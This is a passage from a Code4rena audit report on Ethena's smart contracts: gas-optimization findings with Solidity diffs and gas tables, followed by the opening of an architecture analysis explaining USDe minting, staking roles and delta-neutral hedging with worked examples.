[K42](https://github.com/code-423n4/2023-10-ethena-findings/issues/251), [castle\_chain](https://github.com/code-423n4/2023-10-ethena-findings/issues/183), [evmboi32](https://github.com/code-423n4/2023-10-ethena-findings/issues/143), [naman1778](https://github.com/code-423n4/2023-10-ethena-findings/issues/124), [ybansal2403](https://github.com/code-423n4/2023-10-ethena-findings/issues/81), and [0xhacksmithh](https://github.com/code-423n4/2023-10-ethena-findings/issues/9).*

## [G-01] Use constants for variables that don't change (Save a storage SLOT: 2200 Gas)

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDeV2.sol#L22
```solidity
File: /contracts/StakedUSDeV2.sol
22:  uint24 public MAX_COOLDOWN_DURATION = 90 days;
```
The variable `MAX_COOLDOWN_DURATION` should be declared as a constant variable since it does not change, from the naming, it would seem the intention was to actually make it a constant.

```diff
diff --git a/contracts/StakedUSDeV2.sol b/contracts/StakedUSDeV2.sol
index df2bb48..f8fa980 100644
--- a/contracts/StakedUSDeV2.sol
+++ b/contracts/StakedUSDeV2.sol
@@ -19,7 +19,7 @@ contract StakedUSDeV2 is IStakedUSDeCooldown, StakedUSDe {

   USDeSilo public silo;

-  uint24 public MAX_COOLDOWN_DURATION = 90 days;
+  uint24 public constant MAX_COOLDOWN_DURATION = 90 days;
```

## [G-02] Unnecessary SLOADS inside the constructor (Save 2 SLOADS - 4200 Gas)

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/EthenaMinting.sol#L111-L136
```solidity
File: /contracts/EthenaMinting.sol
111:  constructor(
112:    IUSDe _usde,
113:    address[] memory _assets,
114:    address[] memory _custodians,
115:    address _admin,
116:    uint256 _maxMintPerBlock,
117:    uint256 _maxRedeemPerBlock
118:  ) {
  

134:    // Set the max mint/redeem limits per block
135:    _setMaxMintPerBlock(_maxMintPerBlock);
136:    _setMaxRedeemPerBlock(_maxRedeemPerBlock);
```

In the constructor, we call `_setMaxMintPerBlock()` and `_setMaxRedeemPerBlock()` functions to set `maxMintPerBlock` and `maxRedeemPerBlock` respectively. 
The functions are defined as follows (we only focus on `_setMaxMintPerBlock()` as they are essentially the same).

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/EthenaMinting.sol#L436-L440

```solidity
436:  function _setMaxMintPerBlock(uint256 _maxMintPerBlock) internal {
437:    uint256 oldMaxMintPerBlock = maxMintPerBlock;
438:    maxMintPerBlock = _maxMintPerBlock;
439:    emit MaxMintPerBlockChanged(oldMaxMintPerBlock, maxMintPerBlock);
440:  }
```

This function will first read the current value of `maxMintPerBlock` and store in a local variable,however when called inside the constructor, we know the value of `maxMintPerBlock` is `0` so we don't necessarily need to cache it inside the constructor, we just need to set it.

Caching inside the constructor would just mean we are using an SLOAD(2100 gas) to cache value `0`.

I suggest we refactor the constructor as follows which would save us 2 cold SLOADS:

```diff
     // Set the max mint/redeem limits per block
-    _setMaxMintPerBlock(_maxMintPerBlock);
-    _setMaxRedeemPerBlock(_maxRedeemPerBlock);
+    maxMintPerBlock = _maxMintPerBlock;
+    maxRedeemPerBlock = _maxRedeemPerBlock;
```

If we really need to emit events inside the constructor, we can define a new event that would emit the current set value, i.e. `_maxMintPerBlock` and `_maxRedeemPerBlock`.

## [G-03] Modifier makes it expensive since we end up reading state twice (Saves 1197 Gas on average from the tests)

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/EthenaMinting.sol#L162-L174

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 4657    | 81745   | 123779 | 195520 |
| After  | 4645    | 80548   | 123639 | 195380 |

```solidity
File: /contracts/EthenaMinting.sol
162:  function mint(Order calldata order, Route calldata route, Signature calldata signature)
163:    external
164:    override
165:    nonReentrant
166:    onlyRole(MINTER_ROLE)
167:    belowMaxMintPerBlock(order.usde_amount)
168:  {
169:    if (order.order_type != OrderType.MINT) revert InvalidOrder();
170:    verifyOrder(order, signature);
171:    if (!verifyRoute(route, order.order_type)) revert InvalidRoute();
172:    if (!_deduplicateOrder(order.benefactor, order.nonce)) revert Duplicate();
173:    // Add to the minted amount in this block
174:    mintedPerBlock[block.number] += order.usde_amount;
```

The function `mint()` makes use of the modifier `belowMaxMintPerBlock()` which has the following implementation:

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/EthenaMinting.sol#L97-L100
```solidity
97:  modifier belowMaxMintPerBlock(uint256 mintAmount) {
98:    if (mintedPerBlock[block.number] + mintAmount > maxMintPerBlock) revert MaxMintPerBlockExceeded();
99:    _;
100:  }
```

Note, the modifier reads `mintedPerBlock[block.number]` which is a state varible.

Our `mint()` function also does the same SLOAD when adding to the minted amount.

We can avoid making this two SLOADS by simply in lining this modifier and caching the result of `mintedPerBlock[block.number]` as shown below:

```diff
@@ -164,14 +164,15 @@ contract EthenaMinting is IEthenaMinting, SingleAdminAccessControl, ReentrancyGu
     override
     nonReentrant
     onlyRole(MINTER_ROLE)
-    belowMaxMintPerBlock(order.usde_amount)
   {
+    uint256 _mintedPerBlock = mintedPerBlock[block.number];
+    if (_mintedPerBlock + order.usde_amount > maxMintPerBlock) revert MaxMintPerBlockExceeded();
     if (order.order_type != OrderType.MINT) revert InvalidOrder();
     verifyOrder(order, signature);
     if (!verifyRoute(route, order.order_type)) revert InvalidRoute();
     if (!_deduplicateOrder(order.benefactor, order.nonce)) revert Duplicate();
     // Add to the minted amount in this block
-    mintedPerBlock[block.number] += order.usde_amount;
+    mintedPerBlock[block.number] = _mintedPerBlock + order.usde_amount;
     _transferCollateral(
       order.collateral_amount, order.collateral_asset, order.benefactor, route.addresses, route.ratios
     );
```

Since the modifier was only being used for the function `mint()`, we can go ahead and delete it.

## [G-04] Reading Same state variable twice due to modifier usage (Save 2040 Gas on average from the tests)

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/EthenaMinting.sol#L194-L205
|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 6349    | 40053   | 27127 | 81127 |
| After  | 6337    | 38013   | 20962 | 81017 |

```solidity
File: /contracts/EthenaMinting.sol
194:  function redeem(Order calldata order, Signature calldata signature)
195:    external
196:    override
197:    nonReentrant
198:    onlyRole(REDEEMER_ROLE)
199:    belowMaxRedeemPerBlock(order.usde_amount)
200:  {
201:    if (order.order_type != OrderType.REDEEM) revert InvalidOrder();
202:    verifyOrder(order, signature);
203:    if (!_deduplicateOrder(order.benefactor, order.nonce)) revert Duplicate();
204:    // Add to the redeemed amount in this block
205:    redeemedPerBlock[block.number] += order.usde_amount;
```

Similar to our previous finding, the function `redeem()` uses the modifier `belowMaxRedeemPerBlock()` which is implemented as below:

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/EthenaMinting.sol#L104-L107
```solidity
104:  modifier belowMaxRedeemPerBlock(uint256 redeemAmount) {
105:    if (redeemedPerBlock[block.number] + redeemAmount > maxRedeemPerBlock) revert MaxRedeemPerBlockExceeded();
106:    _;
107:  }
```

We read the state variable `redeemedPerBlock[block.number]` which is also read inside the `redeem()` function. We can inline the modifier which would allow us to cache the call which helps avoid making extra sloads.

Refactor the code as shown below.
```diff
@@ -196,13 +191,14 @@ contract EthenaMinting is IEthenaMinting, SingleAdminAccessControl, ReentrancyGu
     override
     nonReentrant
     onlyRole(REDEEMER_ROLE)
-    belowMaxRedeemPerBlock(order.usde_amount)
   {
+    uint256 _redeemedPerBlock = redeemedPerBlock[block.number];
+    if (_redeemedPerBlock + order.usde_amount > maxRedeemPerBlock) revert MaxRedeemPerBlockExceeded();
     if (order.order_type != OrderType.REDEEM) revert InvalidOrder();
     verifyOrder(order, signature);
     if (!_deduplicateOrder(order.benefactor, order.nonce)) revert Duplicate();
     // Add to the redeemed amount in this block
-    redeemedPerBlock[block.number] += order.usde_amount;
+    redeemedPerBlock[block.number] = _redeemedPerBlock + order.usde_amount;
     usde.burnFrom(order.benefactor, order.usde_amount);
```

Since the modifier was only being used for the function `redeem()`, we can go ahead and delete it.

## [G-05] We can save an entire SLOAD (2100 Gas) by short circuiting the operations

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/EthenaMinting.sol#L413-L433
```solidity
File: /contracts/EthenaMinting.sol
413:  function _transferCollateral(

419:  ) internal {
420:    // cannot mint using unsupported asset or native ETH even if it is supported for redemptions
421:    if (!_supportedAssets.contains(asset) || asset == NATIVE_TOKEN) revert UnsupportedAsset();
```

The if statement has two checks `!_supportedAssets.contains(asset)` and `asset == NATIVE_TOKEN` where the first check involves making a state read while the second check only compares a constant variable to a function parameter.

According to the rules of short circuit, if the first check is true, we do not have to do the second check thus in this case, we should make sure the first check is the cheapest to do.

By reordering as shown below, we can avoid making the state read if `asset == NATIVE_TOKEN` which would save us ~2100 Gas.

```diff
diff --git a/contracts/EthenaMinting.sol b/contracts/EthenaMinting.sol
index 32da3a5..35f4613 100644
--- a/contracts/EthenaMinting.sol
+++ b/contracts/EthenaMinting.sol
@@ -418,7 +418,7 @@ contract EthenaMinting is IEthenaMinting, SingleAdminAccessControl, ReentrancyGu
     uint256[] calldata ratios
   ) internal {
     // cannot mint using unsupported asset or native ETH even if it is supported for redemptions
-    if (!_supportedAssets.contains(asset) || asset == NATIVE_TOKEN) revert UnsupportedAsset();
+    if (asset == NATIVE_TOKEN || !_supportedAssets.contains(asset) ) revert UnsupportedAsset();
     IERC20 token = IERC20(asset);
     uint256 totalTransferred = 0;
     for (uint256 i = 0; i < addresses.length; ++i) {
```

## [G-06] We can avoid making a function call here by utilizing the short circuit rules

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDe.sol#L245-L252
```solidity
File: /contracts/StakedUSDe.sol
245:  function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {
246:    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) {
247:      revert OperationNotAllowed();
248:    }
249:    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {
250:      revert OperationNotAllowed();
251:    }
252:  }
```

```diff
diff --git a/contracts/StakedUSDe.sol b/contracts/StakedUSDe.sol
index 0a56a7d..8551478 100644
--- a/contracts/StakedUSDe.sol
+++ b/contracts/StakedUSDe.sol
@@ -243,7 +243,7 @@ contract StakedUSDe is SingleAdminAccessControl, ReentrancyGuard, ERC20Permit, E
    */

   function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {
-    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) {
+    if (to != address(0) && hasRole(FULL_RESTRICTED_STAKER_ROLE, from)) {
       revert OperationNotAllowed();
     }
     if (hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {
```

## [G-07] Cache function calls

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDe.sol#L89-L99
```solidity
File: /contracts/StakedUSDe.sol
89:  function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
90:    if (getUnvestedAmount() > 0) revert StillVesting();
91:    uint256 newVestingAmount = amount + getUnvestedAmount();
```

Note, we are calling `getUnvestedAmount()` function two times. If we look at the implementation of that function [here](https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDe.sol#L173-L181), we have the following:

```solidity
173:  function getUnvestedAmount() public view returns (uint256) {
174:    uint256 timeSinceLastDistribution = block.timestamp - lastDistributionTimestamp;

176:    if (timeSinceLastDistribution >= VESTING_PERIOD) {
177:      return 0;
178:    }

180:    return ((VESTING_PERIOD - timeSinceLastDistribution) * vestingAmount) / VESTING_PERIOD;
181:  }
```

Note, in this function, we make two state reads(SLOADS) for `lastDistributionTimestamp` and `vestingAmount`. As this is the first SLOAD in this transaction, this means the variables are COLD thus we use 2100 Gas per variable. Ie 4200 Gas for the two variables read.

Calling this function twice would incur a lot of cost (gas). We should cache the results if this call and save them in a local variable as shown below:

```diff
diff --git a/contracts/StakedUSDe.sol b/contracts/StakedUSDe.sol
index 0a56a7d..0953b2f 100644
--- a/contracts/StakedUSDe.sol
+++ b/contracts/StakedUSDe.sol
@@ -87,8 +87,9 @@ contract StakedUSDe is SingleAdminAccessControl, ReentrancyGuard, ERC20Permit, E
    * @param amount The amount of rewards to transfer.
    */
   function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
-    if (getUnvestedAmount() > 0) revert StillVesting();
-    uint256 newVestingAmount = amount + getUnvestedAmount();
+    uint256 _unvestedAmount = getUnvestedAmount();
+    if (_unvestedAmount > 0) revert StillVesting();
+    uint256 newVestingAmount = amount + _unvestedAmount;

     vestingAmount = newVestingAmount;
     lastDistributionTimestamp = block.timestamp;
```

Note: **The following finding is somehow related to this one, some confusion on why the devs choose to do the calls.** The next finding will show an alternate optimization.

## [G-08] Unnecessary function call (Saves 369 Gas on average) 

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDe.sol#L89-L99
|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 4359    | 42190   | 44596 | 66916 |
| After  | 4359    | 41821   | 44065 | 66385 |

```solidity
File: /contracts/StakedUSDe.sol
89:  function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
90:    if (getUnvestedAmount() > 0) revert StillVesting();
91:    uint256 newVestingAmount = amount + getUnvestedAmount();

93:    vestingAmount = newVestingAmount;
94:    lastDistributionTimestamp = block.timestamp;
95:    // transfer assets from rewarder to this contract
96:    IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);

98:    emit RewardsReceived(amount, newVestingAmount);
99:  }
```

The function `getUnvestedAmount()` returns `uint256` which means anything greater than or equal to  `0`.

We revert if the return is greater than 0, which means the only way we get to execute the function `transferInRewards()` is when `getUnvestedAmount()` returns `0`. This begs the question, why do we call the function on the second line if we can only get there when `getUnvestedAmount() == 0`?


```diff
diff --git a/contracts/StakedUSDe.sol b/contracts/StakedUSDe.sol
index 0a56a7d..a378300 100644
--- a/contracts/StakedUSDe.sol
+++ b/contracts/StakedUSDe.sol
@@ -88,7 +88,7 @@ contract StakedUSDe is SingleAdminAccessControl, ReentrancyGuard, ERC20Permit, E
    */
   function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
     if (getUnvestedAmount() > 0) revert StillVesting();
-    uint256 newVestingAmount = amount + getUnvestedAmount();
+    uint256 newVestingAmount = amount;

     vestingAmount = newVestingAmount;
     lastDistributionTimestamp = block.timestamp;
```

## [G-09] Validate function parameters before making function calls or reading any state variables

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/EthenaMinting.sol#L339-L348
```solidity
File: /contracts/EthenaMinting.sol
339:  function verifyOrder(Order calldata order, Signature calldata signature) public view override returns (bool, bytes32) {
340:    bytes32 taker_order_hash = hashOrder(order);
341:    address signer = ECDSA.recover(taker_order_hash, signature.signature_bytes);
342:    if (!(signer == order.benefactor || delegatedSigner[signer][order.benefactor])) revert InvalidSignature();
343:    if (order.beneficiary == address(0)) revert InvalidAmount();
344:    if (order.collateral_amount == 0) revert InvalidAmount();
345:    if (order.usde_amount == 0) revert InvalidAmount();
346:    if (block.timestamp > order.expiry) revert SignatureExpired();
347:    return (true, taker_order_hash);
348:  }
```

```diff
diff --git a/contracts/EthenaMinting.sol b/contracts/EthenaMinting.sol
index 32da3a5..cf642d5 100644
--- a/contracts/EthenaMinting.sol
+++ b/contracts/EthenaMinting.sol
@@ -337,13 +337,13 @@ contract EthenaMinting is IEthenaMinting, SingleAdminAccessControl, ReentrancyGu

   /// @notice assert validity of signed order
   function verifyOrder(Order calldata order, Signature calldata signature) public view override returns (bool, bytes32) {
-    bytes32 taker_order_hash = hashOrder(order);
-    address signer = ECDSA.recover(taker_order_hash, signature.signature_bytes);
-    if (!(signer == order.benefactor || delegatedSigner[signer][order.benefactor])) revert InvalidSignature();
     if (order.beneficiary == address(0)) revert InvalidAmount();
     if (order.collateral_amount == 0) revert InvalidAmount();
     if (order.usde_amount == 0) revert InvalidAmount();
     if (block.timestamp > order.expiry) revert SignatureExpired();
+    bytes32 taker_order_hash = hashOrder(order);
+    address signer = ECDSA.recover(taker_order_hash, signature.signature_bytes);
+    if (!(signer == order.benefactor || delegatedSigner[signer][order.benefactor])) revert InvalidSignature();
     return (true, taker_order_hash);
   }
```

## [G-10] Emit local variables instead of state variable (Save ~100 Gas)

### Emit `_maxMintPerBlock` instead of `maxMintPerBlock`

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/EthenaMinting.sol#L436-L440
```solidity
File: /contracts/EthenaMinting.sol
436:  function _setMaxMintPerBlock(uint256 _maxMintPerBlock) internal {
437:    uint256 oldMaxMintPerBlock = maxMintPerBlock;
438:    maxMintPerBlock = _maxMintPerBlock;
439:    emit MaxMintPerBlockChanged(oldMaxMintPerBlock, maxMintPerBlock);
440:  }
```

Since we are setting our state variable `maxRedeemPerBlock` to the function parameter `_maxRedeemPerBlock`, we should emit the function parameter as it is cheaper to read compared to the state variable:

```diff
diff --git a/contracts/EthenaMinting.sol b/contracts/EthenaMinting.sol
index 32da3a5..f569e40 100644
--- a/contracts/EthenaMinting.sol
+++ b/contracts/EthenaMinting.sol
@@ -436,7 +436,7 @@ contract EthenaMinting is IEthenaMinting, SingleAdminAccessControl, ReentrancyGu
   function _setMaxMintPerBlock(uint256 _maxMintPerBlock) internal {
     uint256 oldMaxMintPerBlock = maxMintPerBlock;
     maxMintPerBlock = _maxMintPerBlock;
-    emit MaxMintPerBlockChanged(oldMaxMintPerBlock, maxMintPerBlock);
+    emit MaxMintPerBlockChanged(oldMaxMintPerBlock, _maxMintPerBlock);
   }
```

### Emit `_maxMintPerBlock` instead of `maxMintPerBlock`

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/EthenaMinting.sol#L443-L447
```solidity
File: /contracts/EthenaMinting.sol
443:  function _setMaxRedeemPerBlock(uint256 _maxRedeemPerBlock) internal {
444:    uint256 oldMaxRedeemPerBlock = maxRedeemPerBlock;
445:    maxRedeemPerBlock = _maxRedeemPerBlock;
446:    emit MaxRedeemPerBlockChanged(oldMaxRedeemPerBlock, maxRedeemPerBlock);
447:  }
```
Since we are setting our state variable `maxRedeemPerBlock` to the function parameter `_maxRedeemPerBlock`, we should emit the function parameter as it is cheaper to read compared to the state variable.

```diff
diff --git a/contracts/EthenaMinting.sol b/contracts/EthenaMinting.sol
index 32da3a5..8198a3e 100644
--- a/contracts/EthenaMinting.sol
+++ b/contracts/EthenaMinting.sol
@@ -443,7 +443,7 @@ contract EthenaMinting is IEthenaMinting, SingleAdminAccessControl, ReentrancyGu
   function _setMaxRedeemPerBlock(uint256 _maxRedeemPerBlock) internal {
     uint256 oldMaxRedeemPerBlock = maxRedeemPerBlock;
     maxRedeemPerBlock = _maxRedeemPerBlock;
-    emit MaxRedeemPerBlockChanged(oldMaxRedeemPerBlock, maxRedeemPerBlock);
+    emit MaxRedeemPerBlockChanged(oldMaxRedeemPerBlock, _maxRedeemPerBlock);
   }

```

### Emit `duration` instead of `cooldownDuration` (Save 1 SLOAD)

https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDeV2.sol#L126-L134
|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 2439    | 3110   | 2439 | 9239 |
| After  | 2425    | 3097   | 2425 | 9225 |

```solidity
File: /contracts/StakedUSDeV2.sol
126:  function setCooldownDuration(uint24 duration) external onlyRole(DEFAULT_ADMIN_ROLE) {
127:    if (duration > MAX_COOLDOWN_DURATION) {
128:      revert InvalidCooldown();
129:    }

131:    uint24 previousDuration = cooldownDuration;
132:    cooldownDuration = duration;
133:    emit CooldownDurationUpdated(previousDuration, cooldownDuration);
134:  }
```

```diff
diff --git a/contracts/StakedUSDeV2.sol b/contracts/StakedUSDeV2.sol
index df2bb48..d3f1b29 100644
--- a/contracts/StakedUSDeV2.sol
+++ b/contracts/StakedUSDeV2.sol
@@ -130,6 +130,6 @@ contract StakedUSDeV2 is IStakedUSDeCooldown, StakedUSDe {

     uint24 previousDuration = cooldownDuration;
     cooldownDuration = duration;
-    emit CooldownDurationUpdated(previousDuration, cooldownDuration);
+    emit CooldownDurationUpdated(previousDuration, duration);
   }
```

**[FJ-Riveros (Ethena) acknowledged](https://github.com/code-423n4/2023-10-ethena-findings/issues/443#issuecomment-1804479032)**



***


# Audit Analysis

For this audit, 25 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-10-ethena-findings/issues/460) by **radev\_sw** received the top score from the judge.

*The following wardens also submitted reports: [oakcobalt](https://github.com/code-423n4/2023-10-ethena-findings/issues/723), [0xSmartContract](https://github.com/code-423n4/2023-10-ethena-findings/issues/708), [hunter\_w3b](https://github.com/code-423n4/2023-10-ethena-findings/issues/701), [Sathish9098](https://github.com/code-423n4/2023-10-ethena-findings/issues/641), [Al-Qa-qa](https://github.com/code-423n4/2023-10-ethena-findings/issues/637), [J4X](https://github.com/code-423n4/2023-10-ethena-findings/issues/539), [Kral01](https://github.com/code-423n4/2023-10-ethena-findings/issues/503), [0xweb3boy](https://github.com/code-423n4/2023-10-ethena-findings/issues/483), [fouzantanveer](https://github.com/code-423n4/2023-10-ethena-findings/issues/458), [albahaca](https://github.com/code-423n4/2023-10-ethena-findings/issues/425), [pavankv](https://github.com/code-423n4/2023-10-ethena-findings/issues/218), [catellatech](https://github.com/code-423n4/2023-10-ethena-findings/issues/193), [invitedtea](https://github.com/code-423n4/2023-10-ethena-findings/issues/185), [ZanyBonzy](https://github.com/code-423n4/2023-10-ethena-findings/issues/171), [D\_Auditor](https://github.com/code-423n4/2023-10-ethena-findings/issues/695), [clara](https://github.com/code-423n4/2023-10-ethena-findings/issues/668), [Bulletprime](https://github.com/code-423n4/2023-10-ethena-findings/issues/656), [xiao](https://github.com/code-423n4/2023-10-ethena-findings/issues/655), [jauvany](https://github.com/code-423n4/2023-10-ethena-findings/issues/597), [JCK](https://github.com/code-423n4/2023-10-ethena-findings/issues/586), [peanuts](https://github.com/code-423n4/2023-10-ethena-findings/issues/559), [K42](https://github.com/code-423n4/2023-10-ethena-findings/issues/543), [Bauchibred](https://github.com/code-423n4/2023-10-ethena-findings/issues/327), and [digitizeworx](https://github.com/code-423n4/2023-10-ethena-findings/issues/87).*


## 1. Architecture Overview

### 1.1. Protocol Explanation
- **Overview:**<br>
  Ethena is developing a DeFi ecosystem with a primary goal of offering a permissionless stablecoin, USDe, that allows users to earn yield within the system. This process is a contrast to traditional stablecoins like USDC, where the central authority (e.g., Circle) benefits from the yield. In Ethena's ecosystem, users can stake their USDe to earn stUSDe, which appreciates over time as the protocol generates yield.

- **Smart Contract Infrastructure:**<br>
  - `USDe.sol`: The contract for the USDe stablecoin, limited in functionality with controls for minting privileges.
  - `EthenaMinting.sol`: This contract mints and redeems USDe in a single, atomic, trustless transaction. Central to user interactions, handling minting and redemption of USDe. It employs EIP712 signatures for transactions, routing collateral through predefined safe channels, and includes security measures against potential compromises by limiting minting and providing emergency roles (GATEKEEPERS) to intervene in suspicious activities.
  - `StakedUSDeV2.sol`: Allows USDe holders to stake their tokens for stUSDe, earning yield from the protocol's profits. It incorporates mechanisms to prevent exploitation of yield payouts and has a cooldown period for unstaking. For legal compliance, it can restrict certain users (based on jurisdiction or law enforcement directives) from staking or freeze their assets, with the provision of fund recovery in extreme cases.

- **Roles in Ethena Ecosystem:**<br>
  - `USDe` minter - can mint any amount of USDe tokens to any address. Expected to be the EthenaMinting contract.
  - `USDe` owner - can set token minter and transfer ownership to another address
  - `USDe` token holder - can not just transfer tokens but burn them and sign permits for others to spend their balance
  - `StakedUSDe` admin - can rescue tokens from the contract and also to redistribute a fully restricted staker's stUSDe balance, as well as give roles to other addresses (for example the FULL_RESTRICTED_STAKER_ROLE role)
  - `StakedUSDeV2` admin - has all power of "StakedUSDe admin" and can also call the setCooldownDuration method
  - `REWARDER_ROLE` - can transfer rewards into the StakedUSDe contract that will be vested over the next 8 hours
  - `BLACKLIST_MANAGER_ROLE` - can do/undo full or soft restriction on a holder of stUSDe
  - `SOFT_RESTRICTED_STAKER_ROLE` - address with this role can't stake his USDe tokens or get stUSDe tokens minted to him
  - `FULL_RESTRICTED_STAKER_ROLE` - address with this role can't burn his stUSDe tokens to unstake his USDe tokens, neither to transfer stUSDe tokens. His balance can be manipulated by the admin of StakedUSDe
  - `MINTER_ROLE` - can actually mint USDe tokens and also transfer EthenaMinting's token or ETH balance to a custodian address
  - `REDEEMER_ROLE` - can redeem collateral assets for burning USDe
  - `EthenaMinting admin` - can set the maxMint/maxRedeem amounts per block and add or remove supported collateral assets and custodian addresses, grant/revoke roles
  - `GATEKEEPER_ROLE` - can disable minting/redeeming of USDe and remove MINTER_ROLE and REDEEMER_ROLE roles from authorized accounts

- **What custodian is? (Chat GPT says)**<br>
  - In the realm of cryptocurrencies and blockchain technology, a "custodian" refers to an entity (company or smart contract) that holds and safeguards an individual's or institution's digital assets. The role of a custodian is critical in scenarios where security and proper asset management are paramount. This concept isn't exclusive to digital assets; traditional financial institutions have custodians as well.
  - Within a blockchain environment, an address usually refers to a specific destination where cryptocurrencies are sent. Think of it like an account number in the traditional banking sense.
    In the context of smart contracts or decentralized applications, `custodianAddresses` likely refer to the collection of blockchain addresses that are authorized to hold assets on behalf of others.
    These addresses are controlled by the custodian, which could be a smart contract or a third-party service that maintains the security of the private keys associated with these addresses.

### 1.2. Codebase Explanation & Examples Scenarios of Intended Protocol Flow

**All possible Actions and Flows in Ethena Protocol:**

**1. Minting USDe:**<br>
Users provide stETH as collateral to mint USDe. The system gives an RFQ (Request for Quote) detailing how much USDe they can create. Upon agreement, the user signs a transaction, and Ethena mints USDe against the stETH, which is then employed in various yield-generating activities, primarily shorting ETH perpetual futures to maintain a delta-neutral position.

**Additional Explanations Related to the `Minting`:**<br>
- So, `USDe` will be equivalent to using DAI, USDC, USDT (`USDe` contract is just the ERC20 token for the stablecoin and this token will be the token used in `StakedUSDeV2.sol` staking contract) where it `doesn't have any yield` and `only the holders of stUSDe` will earn the generated yield.
- The `EthenaMinting.sol` contract is the place where `minting` is done.

**2. Yield Generating:**<br>
Ethena generates yield by taking advantage of the differences in staking returns (3-4% for stETH) and shorting ETH perpetuals (6-8%). Profits are funneled into an insurance fund and later distributed to stakers, enhancing the value of stUSDe relative to USDe.

**3. Maintaining Delta Neutrality:**<br>
Ethena employs a strategy involving stETH and short positions in ETH perpetuals, ensuring the value stability of users' holdings against market volatility.

**Example 1:**<br>
  1. Initial Setup:
    - The user initiates the process by sending 10 stETH to Ethena. The stETH is a token representing staked Ethereum in the Ethereum 2.0 network, allowing holders to earn rewards while keeping liquidity. At the time of the transaction, Ethereum's price is \$2,000; thus, 10 stETH equals \$20,000.
    - Ethena uses these 10 stETH to mint 20,000 USDe stablecoins for the user, reflecting the stETH's dollar value.
    - Simultaneously, Ethena opens a short position on Ethereum perpetual futures (ETH perps) equivalent to 10 ETH. Given the current Ethereum price of \$2,000, this also represents a \$20,000 position. This short position means that Ethena is betting on the Ethereum price going down.
  2. Market Movement and Its Impact:
    - Now, the market faces significant volatility, and the price of Ethereum drops by 90%. As a result, the value of the user's 10 stETH decreases to \$2,000 (reflecting the 90% drop from the original \$20,000 value).
    - However, because Ethena shorted 10 ETH worth of perps, the decrease in Ethereum's price is advantageous for this position. The short ETH perps position now has an unrealized profit of \$18,000. This profit occurs because Ethena 'borrowed' the ETH at a higher price to open the position and can now 'buy' it back at a much lower price, pocketing the difference.
  3. Redemption Process:
    - The user decides to redeem their 20,000 USDe. For Ethena to honor this request, they need to provide the user with the equivalent value in stETH that the USDe represents.
    - Ethena closes the short position on the ETH perps, which means they 'buy' back the ETH at the current market price, realizing the \$18,000 profit due to the price difference from when they opened the short position.
    - With the \$18,000, Ethena purchases 90 stETH at the current market price (\$200 per stETH, as the price has dropped by 90%).
    - Ethena then returns the original 10 stETH along with the 90 stETH purchased from the profits of the short position. So, the user receives 100 stETH, which, at the current market price, is worth \$20,000.

**Example 2:**<br>
  1. Initial Condition:
    - The price of ETH is \$2,000.
    - The user sends in 10 stETH (equivalent to 10 ETH) to Ethena to mint 20,000 USDe (since 10 ETH at \$2,000 per ETH is worth \$20,000).
    - Ethena takes these 10 stETH and opens a short position on 10 ETH's worth of perpetual futures (perps) to hedge against the price movement of ETH.
  2. Market Movement:
    - The market goes up by 50%. Therefore, the price of ETH (and stETH, as it’s pegged to the ETH value) increases to \$3,000.
  3. Position Analysis:
    - The user's 10 stETH is now worth \$30,000 due to the market increase.
    - However, Ethena's short position is now at a notional loss because it was betting on the price of ETH going down, not up. The loss on the short position is \$10,000 (the increase in value per ETH is \$1,000, and Ethena shorted 10 ETH).
  4. Redemption Process:
    - If the user decides to redeem their USDe, they will present their 20,000 USDe.
    - Considering the market movement, the short position's loss needs to be covered. Ethena has to close the short position and realize the loss of \$10,000.
    - After covering the \$10,000 loss, there's \$20,000 worth of stETH left (approximately 6.67 stETH at the new rate of \$3,000 per stETH) to return to the user.
  5. End Result:
